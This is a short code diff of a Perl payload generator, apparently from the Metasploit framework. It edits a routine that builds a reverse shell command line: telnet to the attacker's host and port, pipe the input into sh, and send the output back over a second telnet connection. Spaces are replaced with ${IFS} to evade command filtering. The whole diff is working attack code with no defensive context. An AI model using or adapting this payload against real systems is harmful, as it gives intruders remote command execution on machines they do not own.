@@ -42,11 +42,10 @@ sub CommandString {
   my $port = $self->GetVar('LPORT');
 
   my $command =
-  "sleep 31337|".
+  "sleep 1|".
   "telnet $host $port|".
   "sh|".
-  "telnet $host $port|".
-  "cat>msfout";
+  "telnet $host $port";
   
   $command =~ s/\s+/\$\{IFS\}/g;
   return($command);
